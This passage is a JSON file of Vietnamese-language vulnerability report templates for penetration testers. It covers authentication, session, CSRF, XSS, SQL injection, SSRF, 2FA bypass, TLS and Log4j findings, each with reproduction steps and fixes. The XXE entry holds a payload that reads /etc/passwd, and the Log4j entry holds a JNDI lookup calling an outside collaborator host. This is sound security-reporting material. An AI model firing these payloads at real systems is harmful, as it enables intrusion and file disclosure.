  "createAt": "2021-04-13T10:21:59",
  "updateAt": "2021-11-30T17:05:42"
},{
  "_id": 34,
  "category": "Server Security Misconfiguration",
  "name": "Sử dụng tài khoản mặc định",
  "type": "Đăng nhập",
  "description": "Tài khoản mặc định của ứng dụng (xây dựng trên nền tảng `CMS_NAME`) chưa bị vô hiệu quá, cho phép attacker đăng nhập vào ứng dụng bằng tài khoản này.",
  "impact": "",
  "severity": "CRITICAL",
  "reproduce": "1. Đăng nhập ứng dụng bằng tài khoản mặc định:\n    - Tên đăng nhập: `USERNAME`\n    - Mật khẩu: `PASSWORD`",
  "solution": "Vô hiệu hóa hoặc đổi mật khẩu các tài khoản mặc định.",
  "note": "",
  "createAt": "2021-04-13T10:21:59",
  "updateAt": "2021-11-30T17:06:14"
},{
  "_id": 35,
  "category": "Server Security Misconfiguration",
  "subcategory": "No Rate Limiting on Form",
  "name": "No rate-limiting cho phép bruteforce password",
  "type": "Đăng nhập",
  "description": "Ứng dụng chưa có cơ chế ngăn chặn việc dò quét mật khẩu.",
  "impact": "",
  "severity": "LOW",
  "reproduce": "1. Đăng nhập vào tài khoản `USER_A` với mật khẩu sai 25 lần liên tiếp (có thể sử dụng các công cụ hỗ trợ). \n2. Đăng nhập vào tài khoản `USER_A` với mật khẩu đúng.",
  "solution": "Yêu cầu điền captcha sau 3 lần đăng nhập sai liên tiếp. \n\nNếu mật khẩu có phạm vi dò quét giới hạn (ví dụ luôn là 6 chữ số), thực hiện khóa tài khoản hoặc yêu cầu nhập kèm SMS để xác thực.",
  "note": "- Nghiêm trọng nếu mật khẩu có phạm vi dò quét giới hạn (ví dụ luôn là 6 chữ số).\n- Thấp trong các trường hợp khác.",
  "createAt": "2021-04-13T10:21:59",
  "updateAt": "2021-11-30T17:06:45"
},{
  "_id": 36,
  "category": "Broken Authentication and Session Management",
  "subcategory": "Weak Login Function",
  "name": "Request đăng nhập gửi qua GET thay vì POST\n",
  "type": "Đăng nhập",
  "description": "Chức năng `Đăng nhập` (`URL`) gửi thông tin qua phương thức GET thay vì POST. Các URL kèm tài khoản của người dùng sẽ được lưu lại trong lịch sử của trình duyệt, gây rủi ro khi đăng nhập trên máy tính công cộng.",
  "impact": "",
  "severity": "LOW",
  "reproduce": "1. Đăng nhập ứng dụng.\n2. Thấy URL chứa thông tin đăng nhập trong history của trình duyệt",
  "solution": "Với các dữ liệu nhạy cảm, cần gửi qua phương thức POST thay vì GET.",
  "note": "",
  "createAt": "2021-04-13T10:21:59",
  "updateAt": "2021-11-30T17:07:19"
},{
  "_id": 37,
  "category": "Broken Authentication and Session Management",
  "subcategory": "Session Fixation",
  "name": "Session ID không đổi sau khi đăng nhập ",
  "type": "Đăng nhập",
  "description": "Session ID lưu trong cookie `COOKIE_NAME` không được thay đổi sau khi người dùng đăng nhập thành công. Attacker có thể sử dụng máy tính công cộng đặt sẵn session ID giống với session ID trên máy của attacker và chờ nạn nhân đăng nhập trên máy tính này, do session ID không bị thay đổi nên trạng thái đăng nhập của nạn nhân cũng sẽ được áp dụng trên máy tính của attacker.",
  "impact": "",
  "severity": "LOW",
  "reproduce": "1. Đăng nhập ứng dụng.\n2. Ghi lại giá trị của session ID (lưu trong cookie `COOKIE_NAME`).\n3. Đăng xuất tài khoản và đăng nhập lại.\n4. So sánh giá trị hiện tại của session ID với giá trị lưu ở bước 2.",
  "solution": "Thay đổi giá trị của Session ID sau mỗi phiên đăng nhập thành công.",
  "note": "",
  "createAt": "2021-04-13T10:21:59",
  "updateAt": "2021-11-30T17:07:54"
},{
  "_id": 38,
  "category": "Other",
  "name": "Session ID có thể đoán được",
  "type": "Đăng nhập",
  "description": "",
  "impact": "",
  "severity": "INFO",
  "reproduce": "",
  "solution": "",
  "note": "",
  "createAt": "2021-04-13T10:22:00",
  "updateAt": "2021-11-30T17:08:17"
},{
  "_id": 39,
  "category": "Server Security Misconfiguration",
  "subcategory": "Missing Secure or HTTPOnly Cookie Flag",
  "name": "Session cookie không có cờ Secure",
  "type": "Đăng nhập",
  "description": "Session cookie `COOKIE_NAME` không có cờ `Secure`, cho phép attacker có thể lấy được cookie này thông qua tấn công MITM.",
  "impact": "",
  "severity": "LOW",
  "reproduce": "1. Đăng nhập ứng dụng.\n2. Nhấn F12 để mở cửa sổ Developer của trình duyệt (minh họa với Google Chrome), sau đó chọn tab `Application` > `Storage` > `Cookies` > `URL của ứng dụng`. \n3. Tìm cookie `COOKIE_NAME` và để ý giá trị của cột `Secure`.",
  "solution": "Mọi cookie quan trọng đều cần có cờ Secure.",
  "note": "",
  "createAt": "2021-04-13T10:22:00",
  "updateAt": "2021-11-30T17:09:02"
},{
  "_id": 40,
  "category": "Insufficient Security Configurability",
  "subcategory": "Weak Password Policy",
  "name": "Có thể sử dụng mật khẩu dưới 8 ký tự",
  "type": "Đăng kí",
  "description": "Ứng dụng cho phép sử dụng mật khẩu yếu (dưới 8 ký tự). Mặc dù việc lựa chọn mật khẩu phụ thuộc nhiều vào người dùng, việc có một số ràng buộc tối thiểu về độ mạnh của mật khẩu sẽ hạn chế được ảnh hưởng khi có sự cố xảy ra.",
  "impact": "",
  "severity": "LOW",
  "reproduce": "1. Đăng ký tài khoản bất kỳ với mật khẩu `123456`.",
  "solution": "Yêu cầu mật khẩu phải dài ít nhất 8 ký tự. Nếu có thể, ngăn việc người dùng sử dụng các mật khẩu phổ biến như `12345678`, `11111111`, `123123123`.",
  "note": "",
  "createAt": "2021-04-13T10:22:00",
  "updateAt": "2021-11-30T17:10:02"
},{
  "_id": 41,
  "category": "Server Security Misconfiguration",
  "subcategory": "No Rate Limiting on Form",
  "name": "Không có captcha",
  "type": "Đăng kí",
  "description": "Chức năng Đăng ký tài khoản (`URL`) không yêu cầu nhập captcha. Attacker có thể lợi dụng để dò tìm các username tồn tại trong hệ thống thông qua việc tự động hóa quá trình đăng ký. Việc lấy được danh sách tài khoản hợp lệ sẽ có ích cho attacker cho các bước tấn công tiếp theo, ví dụ dò quét mật khẩu.",
  "impact": "",
  "severity": "LOW",
  "reproduce": "1. Thực hiện đăng ký tài khoản bất kỳ và nhận thấy ứng dụng không yêu cầu nhập captcha.",
  "solution": "Yêu cầu nhập captcha khi đăng ký tài khoản.",
  "note": "",
  "createAt": "2021-04-13T10:22:00",
  "updateAt": "2021-11-30T17:10:24"
},{
  "_id": 42,
  "category": "Other",
  "name": "Có thể đăng ký với tài khoản đã tồn tại",
  "type": "Đăng kí",
  "description": "",
  "impact": "",
  "severity": "INFO",
  "reproduce": "",
  "solution": "",
  "note": "",
  "createAt": "2021-04-13T10:22:00",
  "updateAt": "2021-11-30T17:10:43"
},{
  "_id": 43,
  "category": "Broken Authentication and Session Management",
  "subcategory": "Failure to Invalidate Session",
  "name": "Session vẫn còn hiệu lực sau khi đã đăng xuất/đổi mật khẩu",
  "type": "Đăng xuất",
  "description": "Ứng dụng không xóa phiên đăng nhập cũ ở phía server sau khi đã đăng xuất/đổi mật khẩu. Điều này gây ra rủi ro khi người dùng sử dụng máy tính công cộng và bị attacker chiếm được phiên đăng nhập, ngay cả khi người dùng đã tiến hành đăng xuất/đổi mật khẩu.",
  "impact": "",
  "severity": "LOW",
  "reproduce": "1. Thiết lập trình duyệt cho đi qua một phần mềm proxy (ví dụ Burp Suite).\n2. Đăng nhập ứng dụng.\n3. Truy cập `URL`. Trong phần mềm proxy, lưu lại HTTP request này.\n4. Đăng xuất/Đổi mật khẩu tài khoản.\n5. Trong phần mềm proxy, gửi lại HTTP request và nhận thấy ứng dụng vẫn phản hồi ở trạng thái người dùng đang đăng nhập.",
  "solution": "Vô hiệu hóa các phiên làm việc ở cả client và server sau khi người dùng đăng xuất/đổi mật khẩu.",
  "note": "Không coi là lỗi nếu quản lý session bằng JWT.",
  "createAt": "2021-04-13T10:22:00",
  "updateAt": "2021-11-30T17:11:52"
},{
  "_id": 44,
  "category": "Unvalidated Redirects and Forwards",
  "subcategory": "Open Redirect",
  "name": "Open redirect",
  "type": "Đăng xuất",
  "description": "Lỗi Open Redirect ở chức năng Đăng xuất (`URL`), cho phép attacker điều hướng nạn nhân đến website khác có nội dung độc hại (ví dụ website với giao diện giả mạo yêu cầu người dùng điền lại thông tin đăng nhập để đánh cắp)",
  "impact": "",
  "severity": "LOW",
  "reproduce": "1. Đăng nhập ứng dụng.\n2. Truy cập `URL`.\n3. Trình duyệt sẽ redirect sang địa chỉ https://google.com.",
  "solution": "Chỉ cho phép redirect về các URL thuộc domain của ứng dụng.",
  "note": "",
  "createAt": "2021-04-13T10:22:00",
  "updateAt": "2021-11-30T17:12:37"
},{
  "_id": 45,
  "category": "Server Security Misconfiguration",
  "subcategory": "Lack of Security Headers",
  "name": "Insecure browser caching",
  "type": "Đăng xuất",
  "description": "Do không có header `Cache-Control`, trình duyệt lưu lại các nội dung nhạy cảm của phiên đăng nhập và cho phép truy cập ngay cả khi người dùng đã đăng xuất. Điều này gây ra rủi ro khi người dùng sử dụng máy tính công cộng.",
  "impact": "",
  "severity": "LOW",
  "reproduce": "1. Đăng nhập ứng dụng.\n2. Truy cập `URL` (nên chọn trang web có chứa thông tin cá nhân của tài khoản).\n3. Đăng xuất tài khoản.\n4. Nhấn nút Back trên trình duyệt và thấy rằng nội dung của trang `URL` vẫn được hiển thị.",
  "solution": "Trả về header `Cache-Control` với giá trị `no-store`. Tham khảo thêm tại `https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control`",
  "note": "",
  "createAt": "2021-04-13T10:22:01",
  "updateAt": "2021-11-30T17:13:14"
},{
  "_id": 46,
  "category": "Broken Access Control (BAC)",
  "subcategory": "Server-Side Request Forgery (SSRF)",
  "name": "SSRF qua HTML Injection",
  "type": "Xử lý file",
  "description": "Chức năng  `FUNCTION_NAME` (`URL`) xuất file PDF với thông tin lấy từ dữ liệu do người dùng gửi lên. Bằng việc nhập mã HTML, attacker có thể đọc được thông tin nhạy cảm thuộc mạng nội bộ của server dựa trên tấn công SSRF.",
  "impact": "",
  "severity": "INFO",
  "reproduce": "1. <Các bước dẫn đến việc nhập mã tấn công>\n2. Nhập `PARAM_NAME` với giá trị như sau:\n\n    ```html\n    Payload <iframe> hoặc <script> (liên hệ QA)\n    ```\n    \n3. <Các bước dẫn đến chức năng xuất file PDF>\n4. <Nêu dấu hiệu nhận biết đã khai thác lỗi thành công>",
  "solution": "Không xử lý các thẻ HTML (coi là văn bản thuần) khi xuất file PDF, hoặc chỉ xử lý các thẻ an toàn.",
  "note": "- Nghiêm trọng nếu ứng dụng được deploy trên cloud và có thể dẫn đến leak source code/RCE\n- Cao trong các trường hợp khác",
  "createAt": "2021-04-13T10:22:01",
  "updateAt": "2021-11-30T17:04:18"
},{
  "_id": 47,
  "category": "Server-Side Injection",
  "subcategory": "XML External Entity Injection (XXE)",
  "name": "XXE",
  "type": "Xử lý file",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) bị lỗi XXE khi xử lý dữ liệu XML. Attacker có thể <nêu ảnh hưởng>.",
  "impact": "",
  "severity": "CRITICAL",
  "reproduce": "1. <Các bước dẫn đến thao tác gửi dữ liệu XML (thay đổi nội dung file xml nếu cần)>\n\n    ```\n    <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n    <!DOCTYPE replace [<!ENTITY example SYSTEM \"file:///etc/passwd\">]>\n    <profilingConfigs>\n        <comment>&example;</comment>\n            ...\n    </profilingConfigs>\n    ```\n\n2. <Các bước dẫn đến việc parse payload XML (nếu có)>\n3. <Nêu dấu hiệu nhận biết đã khai thác lỗi thành công>",
  "solution": "Tùy thuộc vào ngôn ngữ lập trình, tham khảo hướng khắc phục lỗi tại `https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html`",
  "note": "- Thấp nếu SSRF nhưng không đọc được response hoặc không truy cập được internal network\n- Trung bình nếu DOS và cần user (không thể tự đăng ký)\n- Cao nếu DOS và cần user (có thể tự đăng ký) hoặc không cần user\n- Cao nếu SSRF internal network và đọc được response\n- Nghiêm trọng nếu đọc được file trên server/RCE",
  "createAt": "2021-04-13T10:22:01",
  "updateAt": "2021-11-30T17:05:03"
},{
  "_id": 48,
  "category": "Server Security Misconfiguration",
  "subcategory": "CAPTCHA",
  "name": "Captcha có thể dùng lại",
  "type": "Captcha",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) sử dụng captcha để giới hạn việc tự động gửi request. Tuy nhiên, attacker có thể vượt qua cơ chế bảo vệ này bằng cách sử dụng lại captcha cũ.",
  "impact": "",
  "severity": "MEDIUM",
  "reproduce": "1. Thiết lập trình duyệt cho đi qua một phần mềm proxy (ví dụ Burp Suite).\n2. <Các bước dẫn đến việc nhập captcha>\n3. Trong phần mềm proxy, lưu lại HTTP request này.\n4. Gửi lại request vừa lưu (có thể thay đổi giá trị các tham số, trừ captcha), nhận thấy ứng dụng vẫn xử lý request như khi nhập captcha đúng.",
  "solution": "Vô hiệu hóa captcha đã được sử dụng.",
  "note": "",
  "createAt": "2021-04-13T10:22:01",
  "updateAt": "2021-11-30T17:14:06"
},{
  "_id": 49,
  "category": "Cross-Site Scripting (XSS)",
  "subcategory": "Reflected",
  "name": "Reflected XSS",
  "type": "CÁC LỖI KHÔNG NẰM TRONG CHECKLIST/QUÉT BỞI SCANNER",
  "description": "Lỗi Reflected XSS ở chức năng `FUNCTION_NAME` (`URL`), tham số `PARAM_NAME`. Attacker có thể thực thi mã Javascript trên máy của nạn nhân (đánh cắp phiên đăng nhập, tạo form đăng nhập giả, tấn công CSRF, hoặc điều hướng người dùng sang các website độc hại, ...).",
  "impact": "",
  "severity": "MEDIUM",
  "reproduce": "1. Đăng nhập ứng dụng <nếu lỗi cần phải đăng nhập>\n2. Truy cập `URL` (<ghi rõ nếu lỗi chỉ hoạt động trên một trình duyệt cụ thể>).\n3. Mã tấn công được thực thi, hiển thị thông báo chứa domain của website.",
  "solution": "Xử lý dữ liệu an toàn trước khi in ra HTML.",
  "note": "",
  "createAt": "2021-04-15T10:32:57",
  "updateAt": "2021-11-30T17:14:47"
},{
  "_id": 50,
  "category": "Cross-Site Scripting (XSS)",
  "subcategory": "Stored",
  "name": "Stored XSS",
  "type": "CÁC LỖI KHÔNG NẰM TRONG CHECKLIST/QUÉT BỞI SCANNER",
  "description": "Lỗi Stored XSS ở chức năng `FUNCTION_NAME` (`URL`) cho phép attacker thực thi code Javascript trên máy nạn nhân. Attacker có thể tạo form đăng nhập giả, tấn công CSRF, hoặc điều hướng nạn nhân sang các website độc hại, ...",
  "impact": "",
  "severity": "INFO",
  "reproduce": "1. Đăng nhập vào tài khoản USER_A.\n2. <Nêu các bước dẫn đến việc payload XSS được lưu lại>\n3. Đăng nhập vài tài khoản USER_B.\n4. <Nêu các bước dẫn đến việc payload XSS được thực thi>",
  "solution": "Xử lý dữ liệu an toàn trước khi in ra HTML.",
  "note": "- Thấp (nếu là user quyền cao tấn công user quyền thấp)\n- Trung bình (nếu là user quyền cao tấn công user quyền cao hơn)\n- Cao (nếu là user quyền thấp tấn công user quyền cao)",
  "createAt": "2021-04-15T10:35:35",
  "updateAt": "2021-11-30T17:15:09"
},{
  "_id": 51,
  "category": "Server-Side Injection",
  "subcategory": "SQL Injection",
  "name": "SQLI (có dữ liệu trả về)",
  "type": "CÁC LỖI KHÔNG NẰM TRONG CHECKLIST/QUÉT BỞI SCANNER",
  "description": "Lỗi SQL Injection ở chức năng `FUNCTION_NAME` (`URL`) cho phép attacker truy xuất dữ liệu từ Database trái phép.",
  "impact": "",
  "severity": "CRITICAL",
  "reproduce": "1. <Các bước dẫn đến chức năng bị lỗi phụ thuộc vào ứng dụng>\n2. Tên database được trả về trong response của request:\n\n    ```\n    Paste phần response có chứa tên database\n    ```",
  "solution": "Thực hiện truy vấn SQL an toàn qua ORM hoặc Prepared Statement.",
  "note": "",
  "createAt": "2021-04-15T10:37:58",
  "updateAt": "2021-11-30T17:15:31"
},{
  "_id": 52,
  "category": "Server-Side Injection",
  "subcategory": "SQL Injection",
  "name": "SQLI (không có dữ liệu trả về)",
  "type": "CÁC LỖI KHÔNG NẰM TRONG CHECKLIST/QUÉT BỞI SCANNER",
  "description": "Lỗi SQL Injection ở chức năng `FUNCTION_NAME` (`URL`) cho phép attacker truy xuất dữ liệu từ Database trái phép.",
  "impact": "",
  "severity": "CRITICAL",
  "reproduce": "1. <Các bước dẫn đến chức năng bị lỗi phụ thuộc vào ứng dụng>\n2. Với trường `PARAM_NAME` có giá trị `PARAM_VALUE` (<payload dẫn đến việc sleep 5s>), ứng dụng mất hơn 5s để thực hiện.\n3. Với trường `PARAM_NAME` có giá trị `PARAM_VALUE2` (<payload không dẫn việc sleep 5s>), ứng dụng mất dưới 5s để thực hiện.",
  "solution": "Thực hiện truy vấn SQL an toàn qua ORM hoặc Prepared Statement.",
  "note": "",
  "createAt": "2021-04-15T10:40:12",
  "updateAt": "2021-11-30T17:15:45"
},{
  "_id": 53,
  "category": "Cross-Site Request Forgery (CSRF)",
  "name": "CSRF (Site-Wide) (không có CSRF token)",
  "type": "CÁC LỖI KHÔNG NẰM TRONG CHECKLIST/QUÉT BỞI SCANNER",
  "description": "Các chức năng của ứng dụng không có cơ chế phòng chống tấn công CSRF, cho phép attacker giả mạo thao tác của nạn nhân trên ứng dụng. ",
  "impact": "",
  "severity": "MEDIUM",
  "reproduce": "Minh họa với chức năng `FUNCTION_NAME` (`URL`) trên trình duyệt Firefox:\n\n1. Đăng nhập ứng dụng.\n2. Tạo file `poc.html` với nội dung sau:\n\n    ```\n    <Nội dung file>\n    ```\n\n3. Mở file `poc.html` trong cùng trình duyệt đang đăng nhập ứng dụng.\n4. <Nêu kết quả>\n",
  "solution": "Bổ sung cơ chế chống tấn công CSRF, ví dụ như sử dụng CSRF token.",
  "note": "",
  "createAt": "2021-04-15T10:44:06",
  "updateAt": "2021-11-30T17:16:03"
},{
  "_id": 54,
  "category": "Cross-Site Request Forgery (CSRF)",
  "name": "CSRF (Site-Wide) (có token nhưng không kiểm tra đúng)",
  "type": "CÁC LỖI KHÔNG NẰM TRONG CHECKLIST/QUÉT BỞI SCANNER",
  "description": "Các request của ứng dụng có gửi kèm CSRF token, tuy nhiên token này không được kiểm tra đúng phía server, cho phép attacker giả mạo thao tác của nạn nhân trên ứng dụng. ",
  "impact": "",
  "severity": "MEDIUM",
  "reproduce": "Minh họa với chức năng `FUNCTION_NAME` (`URL`) trên trình duyệt Firefox:\n\n1. Đăng nhập ứng dụng.\n2. Tạo file `poc.html` với nội dung sau:\n\n    ```\n    <Nội dung file>\n    ```\n\n3. Mở file `poc.html` trong cùng trình duyệt đang đăng nhập ứng dụng.\n4. <Nêu kết quả>\n",
  "solution": "Đảm bảo CSRF token được kiểm tra đúng phía server.",
  "note": "",
  "createAt": "2021-04-15T10:46:46",
  "updateAt": "2021-11-30T17:16:17"
},{
  "_id": 55,
  "category": "Cross-Site Request Forgery (CSRF)",
  "name": "CSRF (Site-Wide) (token có thể dùng chung giữa các user)",
  "type": "CÁC LỖI KHÔNG NẰM TRONG CHECKLIST/QUÉT BỞI SCANNER",
  "description": "Cơ chế phòng chống tấn công CSRF của ứng dụng hoạt động không chính xác, do CSRF token có thể được dùng chung giữa các người dùng, cho phép attacker giả mạo thao tác của nạn nhân trên ứng dụng.",
  "impact": "",
  "severity": "MEDIUM",
  "reproduce": "Minh họa với chức năng `FUNCTION_NAME` (`URL`) trên trình duyệt Firefox:\n1. Đăng nhập vào tài khoản USER_A.\n2. <Nêu cách lấy CSRF token của USER_A, có thể từ source HTML, từ cookie, ...).\n3. Mở một trình duyệt khác, đăng nhập vào tài khoản USER_B.\n4. Tạo file `poc.html` với nội dung sau:\n\n    ```\n    <Nội dung file>\n    ```\n\n5. Mở file `poc.html` trong cùng trình duyệt đang đăng nhập tài khoản USER_B.\n6. <Nêu kết quả>",
  "solution": "Bổ sung cơ chế chống tấn công CSRF, ví dụ như sử dụng CSRF token.",
  "note": "",
  "createAt": "2021-04-15T10:48:30",
  "updateAt": "2021-11-30T17:16:26"
},{
  "_id": 111,
  "category": "Other",
  "name": "2FA Bypass",
  "type": "2FA",
  "description": "Ứng dụng xác thực 2FA bằng cặp giá trị `<OTP_ID>`, `<OTP>`, tuy nhiên không kiểm tra để đảm bảo rằng cặp giá trị này thuộc về phiên đăng nhập hiện tại. Attacker có thể sử dụng cặp giá trị của mình để xác thực 2FA cho một tài khoản bất kỳ khác, dẫn đến vô hiệu hóa xác thực 2FA.",
  "impact": "",
  "severity": "HIGH",
  "reproduce": "1. Thiết lập trình duyệt cho đi qua một phần mềm proxy (ví dụ Burp Suite).\n2. Đăng nhập vài tài khoản attacker (`USER_A`).\n3. <Các bước dẫn đến chức năng xác thực 2FA>.\n4. Trong Burp Suite, bắt request gửi đến `URL`, ghi lại cặp giá trị `<OTP_ID>`, `<OTP>` và drop request (để giữ cặp giá trị ở trạng thái chưa sử dụng).\n5. Đăng nhập vài tài khoản nạn nhân (`USER_B`).\n6. <Các bước dẫn đến chức năng xác thực 2FA>.\n7. Trong Burp Suite, bắt request gửi đến `URL`, thay thế `<OTP_ID>`, `<OTP>` bằng cặp giá trị đã lưu trước đó và chuyển tiếp request.\n8. Nhận thấy hoàn tất xác thực 2FA ở tài khoản nạn nhân.",
  "solution": "Đảm bảo rằng cặp giá trị `<OTP_ID>`, `<OTP>` mà người dùng gửi lên thuộc về phiên đăng nhập hiện tại.",
  "note": "",
  "createAt": "2021-06-21T17:39:40",
  "updateAt": "2021-11-30T17:17:48"
},{
  "_id": 112,
  "category": "Server Security Misconfiguration",
  "subcategory": "Insecure SSL",
  "name": "Xác thực HTTPS yếu",
  "type": "Mobile",
  "description": "Ứng dụng không kiểm tra chứng chỉ của domain cần kết nối, cho phép attacker thực hiện tấn công MITM.",
  "impact": "",
  "severity": "HIGH",
  "reproduce": "1. Cấu hình mạng trên điện thoại (hoặc thiết bị giả lập) cho đi qua một phần mềm proxy (ví dụ Burp Suite), nhưng trên điện thoại không cài CA Certificate của phần mềm proxy.\n2. Sử dụng ứng dụng.\n3. Nhận thấy phần mềm proxy vẫn bắt được các dữ liệu truyền nhận giữa ứng dụng và máy chủ.",
  "solution": "Việc tắt xác thực chứng chỉ thường được dùng trong môi trường phát triển, tuy nhiên ở môi trường hoạt động thật, việc xác thực này phải luôn được bật.",
  "note": "Khi nạn nhân sử dụng mạng của attacker (ví dụ Wifi ở quán cafe, trung tâm thương mại, ...), mọi dữ liệu truyền nhận giữa ứng dụng và máy chủ sẽ bị đánh cắp.",
  "createAt": "2021-08-12T15:44:58",
  "updateAt": "2021-11-30T17:17:23"
},{
  "_id": 113,
  "category": "Server-Side Injection",
  "subcategory": "Remote Code Execution (RCE)",
  "variant": "",
  "name": "Apache Log4j Remote Code Execution",
  "type": "Ứng dụng Java",
  "description": "Ứng dụng sử dụng thư viện log4j tồn tại lỗ hổng cho phép attacker thực hiện chạy mã tùy ý tại chức năng **FUNCTION (URL)**\n",
  "impact": "",
  "severity": "CRITICAL",
  "reproduce": "1. Tại chức năng **FUNCTION (URL)** chèn payload `${jndi:ldap://newsubdomain.burpcollaborator.net/a}` vào **vị trí**\n2. <Nêu kết quả>",
  "solution": "Nâng cấp phiên bản log4j hoặc chạy ứng dụng với java option `-Dlog4j2.formatMsgNoLookups=true`",
  "note": "",
  "createAt": "2021-12-13T10:51:39",
  "updateAt": "2021-12-21T20:49:48"
},{
  "_id": 114,
  "category": "Application-Level Denial-of-Service (DoS)",
  "subcategory": "High Impact and/or Medium Difficulty",
  "variant": "",
  "name": "DOS tại chức năng đăng nhập",
  "type": "Đăng nhập",
  "description": "Chức năng đăng nhập thực hiện `disable/block` user khi đăng nhập sai quá nhiều lần. Attacker có thể  lợi dụng chức năng để `disable/block` hàng loạt user gây cản trở giao dịch/ hoạt động bình thường của ứng dụng.",
  "impact": "",
  "severity": "MEDIUM",
  "reproduce": "\n1.  Đăng nhập vào tài khoản `DEMO` với mật khẩu sai 25 lần liên tiếp (có thể sử dụng các công cụ hỗ trợ).\n2. Đăng nhập vào tài khoản `DEMO` với mật khẩu đúng. Hệ thống cảnh báo tài khoản: `message`, không thể đăng nhập.\n\n",
  "solution": "Nên sử dụng captcha sau 3 lần đăng nhập sai liên tiếp.",
  "note": "",
  "createAt": "2022-04-28T09:22:53",
  "updateAt": "2022-04-28T09:37:10"
}]